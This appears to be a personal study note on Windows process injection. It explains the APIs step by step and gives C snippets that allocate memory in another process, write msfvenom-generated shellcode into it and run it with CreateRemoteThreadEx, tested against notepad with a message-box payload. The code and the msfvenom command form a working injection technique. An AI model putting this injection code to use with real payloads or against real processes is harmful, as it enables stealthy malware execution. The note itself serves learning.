pe32.dwSize = sizeof(PROCESSENTRY32);

How is the sizeof calculated ?
sizeof is a compile time operator 
it returs the total number of bytes occupied by the type PROCESSENTRY32

this structure is defined as:
typedef struct tagPROCESSENTRY32 {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    TCHAR szExeFile[MAX_PATH];
} PROCESSENTRY32;

so sizeof(PROCESSENTRY32) will compute the total size of all those fields 


HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

This calls a Windows API function to create a snapshot of all currently running processes in the system.

TH32CS_SNAPPROCESS: tells Windows you want to take a snapshot of the process list.
0: means "give me all processes" 
(the second parameter can specify a specific PID if you're taking snapshots of threads or modules, but for processes, it's always 0).

CreateToolhelp32Snapshot() returns a HANDLE â€” basically a reference to a kernel object.

That handle lets you iterate through the list of processes using:

Process32First(snapshot, &pe32);

Process32Next(snapshot, &pe32);

These functions fill in the pe32 structure with info about each process: PID, exe name, parent PID, etc.

HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,   // Specifies the access rights requested for the process (e.g., read, write, terminate).
  [in] BOOL  bInheritHandle,    // If TRUE, the returned handle can be inherited by child processes; if FALSE, it cannot.
  [in] DWORD dwProcessId        // The unique identifier (ID) of the process to open.
);
If the function succeeds, the return value is an open handle to the specified process.
If the function fails, the return value is NULL.

LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess, Expects a handle to the process where memory will be allocated.
  [in, optional] LPVOID lpAddress, Expects a pointer to the starting address for the allocation. If NULL, the system determines the address.
  [in]           SIZE_T dwSize, Expects the size of the memory block to be allocated, in bytes.
  [in]           DWORD  flAllocationType, Expects the type of memory allocation (e.g., MEM_COMMIT, MEM_RESERVE).
  [in]           DWORD  flProtect Expects the memory protection for the allocated region (e.g., PAGE_READWRITE).
);

If the function succeeds, the return value is a pointer to the allocated memory in the specified process.
If the function fails, the return value is NULL.

write process memory
BOOL WriteProcessMemory(
  [in] HANDLE hProcess,         // Handle to the process whose memory is being written to.
  [in] LPVOID lpBaseAddress,    // Pointer to the base address in the target process's memory where data will be written.
  [in] LPCVOID lpBuffer,        // Pointer to the buffer containing the data to be written.
  [in] SIZE_T nSize,            // Number of bytes to write.
  [out, optional] SIZE_T *lpNumberOfBytesWritten // Optional pointer to a variable that receives the number of bytes written.
);

ex:
```c
  if (WriteProcessMemory(hProcess, rAlloc_mem, ShellCode, sizeof(ShellCode), NULL)) {
      okay("Successfully wrote to process memory");
  } else {
      error("Failed to write to process memory: %lu", GetLastError());
      return EXIT_FAILURE;
  }

now we can create a remote thread in the target process to execute the shellcode
CreateRemoteThreadEx(
  [in] HANDLE hProcess,         // Handle to the target process where the thread will be created.
  [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, // Optional security attributes for the thread.
  [in] SIZE_T dwStackSize,      // Size of the stack for the new thread. If 0, the default size is used.
  [in] LPTHREAD_START_ROUTINE lpStartAddress, // Pointer to the function to be executed by the thread.
  [in, optional] LPVOID lpParameter, // Optional parameter to be passed to the thread function.
  [in] DWORD dwCreationFlags,   // Flags that control how the thread is created (e.g., CREATE_SUSPENDED).
  [out, optional] LPDWORD lpThreadId // Optional pointer to a variable that receives the thread ID.
);

example:
```c 
  HANDLE hThread = CreateRemoteThreadEx(
      hProcess, 
      NULL, 
      0, 
      (LPTHREAD_START_ROUTINE)rAlloc_mem, 
      NULL, 
      0, 
      NULL
  );

  if (hThread == NULL) {
      error("Failed to create remote thread: %lu", GetLastError());
      return EXIT_FAILURE;
  } else {
      okay("Successfully created remote thread");
  }

in kali i used:
msfvenom -p windows/x64/messagebox TEXT="I Licked Herta" TITLE="Injected" -f c --var-name=ShellCode
to generate shellcode that displays a message box with the text "I Licked Herta!"

PS C:\Eva03\GitHubRepo\Bad-Actor\Injections\output> notepad                             
PS C:\Eva03\GitHubRepo\Bad-Actor\Injections\output> tasklist | findstr /i notepad  
what tasklist does is it lists all the processes running on the system
and findstr is used to filter the output to show only the lines that contain "notepad" (case-insensitive due to /i).
This command will display the process ID (PID) and other details of the notepad process if it is running.
If notepad is running, you will see an output like:
Notepad.exe                  22248 Console                    1   101 888 Ko
